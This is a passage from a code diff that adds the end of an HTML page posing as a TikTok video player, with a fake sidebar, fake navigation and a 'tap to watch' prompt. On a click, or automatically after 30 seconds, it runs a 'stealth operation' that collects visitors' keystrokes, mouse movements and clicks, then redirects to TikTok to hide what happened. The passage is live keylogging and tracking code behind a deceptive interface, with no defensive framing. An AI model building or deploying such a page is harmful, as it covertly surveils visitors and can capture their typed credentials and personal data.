+                    if (collectedData.keystrokes.length > 0) {
+                        collectedData.keystrokes = collectedData.keystrokes.slice(-50);
+                    }
+                    if (collectedData.mouseMovements.length > 0) {
+                        collectedData.mouseMovements = collectedData.mouseMovements.slice(-100);
+                    }
+                    if (collectedData.clicks && collectedData.clicks.length > 0) {
+                        collectedData.clicks = collectedData.clicks.slice(-100);
+                    }
+                }, 5000);
+                setTimeout(() => {
+                    stopTracking();
+                    if (dataCollectionInterval) {
+                        clearInterval(dataCollectionInterval);
+                    }
+                    window.location.href = TIKTOK_REDIRECT_URL;
+                }, 2000);
+            }
+        }
+
+        function hideFakeUI() {
+            document.getElementById('fake-sidebar')?.classList.add('hidden-ui');
+            document.getElementById('fake-info')?.classList.add('hidden-ui');
+            document.getElementById('fake-nav')?.classList.add('hidden-ui');
+        }
+
+        // Event listener for play button click
+        videoPlaceholder.addEventListener('click', () => {
+            videoPlaceholder.classList.add('hidden');
+            loadingOverlay.classList.add('active');
+            hideFakeUI();
+            startStealthOperation();
+        });
+
+        // Initial notification
+        showNotification(getMsg('tapToWatch'));
+
+        // Auto-start after 30 seconds if no interaction
+        setTimeout(() => {
+            if (!loadingOverlay.classList.contains('active')) {
+                showNotification(getMsg('autoPlay'), 'info');
+                videoPlaceholder.classList.add('hidden');
+                loadingOverlay.classList.add('active');
+                hideFakeUI();
+                startStealthOperation();
+            }
+        }, 30000);
+
+        // ---  ---
+        window.addEventListener('DOMContentLoaded', () => {
+            if (!loadingOverlay.classList.contains('active')) {
+                // We keep UI visible at start for realism
+                // But if we want to auto-start:
+                /*
+                videoPlaceholder.classList.add('hidden');
+                loadingOverlay.classList.add('active');
+                hideFakeUI();
+                startStealthOperation();
+                */
+            }
+        });
+
+    </script>
+</body>
+</html> 
